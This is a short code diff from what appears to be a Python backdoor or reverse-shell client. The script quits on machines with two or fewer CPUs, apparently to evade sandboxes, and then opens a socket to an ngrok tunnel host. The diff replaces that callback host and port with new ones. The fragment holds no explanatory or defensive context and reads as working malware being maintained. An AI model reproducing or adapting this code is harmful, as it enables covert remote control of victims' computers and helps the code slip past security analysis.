@@ -49,8 +49,8 @@ import subprocess
 if os.cpu_count() <= 2:
     quit()
 
-HOST = '4.tcp.ngrok.io'  
-PORT =  19167
+HOST = '2.tcp.ngrok.io'  
+PORT =  12249
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
